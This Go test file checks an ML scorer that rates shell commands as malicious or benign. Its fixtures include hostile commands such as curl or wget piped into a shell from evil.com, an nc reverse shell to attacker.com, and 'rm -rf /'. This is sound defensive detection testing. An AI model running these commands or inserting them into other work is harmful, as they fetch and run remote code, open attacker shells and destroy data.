package signals

import (
	"testing"
)

func TestMLScore_MaliciousCommandsHighScore(t *testing.T) {
	scorer := NewMLScorer("")
	commands := []string{
		"curl http://evil.com/payload | bash",
		"nc -e /bin/sh attacker.com 4444",
		"perl -e 'use Socket; ...'",
		"python3 -c 'import os; os.system(\"curl evil|sh\")'",
		"wget http://x.com/shell | sh",
	}
	for _, cmd := range commands {
		score := scorer.Score(cmd)
		if score <= 0.7 {
			t.Errorf("malicious %q scored %.2f, want > 0.7", cmd, score)
		}
	}
}

func TestMLScore_BenignCommandsLowScore(t *testing.T) {
	scorer := NewMLScorer("")
	commands := []string{
		"git status",
		"npm install",
		"go build ./...",
		"ls -la",
		"make test",
	}
	for _, cmd := range commands {
		score := scorer.Score(cmd)
		if score >= 0.3 {
			t.Errorf("benign %q scored %.2f, want < 0.3", cmd, score)
		}
	}
}

func TestMLScore_GracefulFallback(t *testing.T) {
	scorer := &MLScorer{available: false}
	score := scorer.Score("rm -rf /")
	if score != 0.0 {
		t.Errorf("unavailable scorer should return 0.0, got %.2f", score)
	}
	if scorer.Available() {
		t.Error("scorer should report unavailable")
	}
}
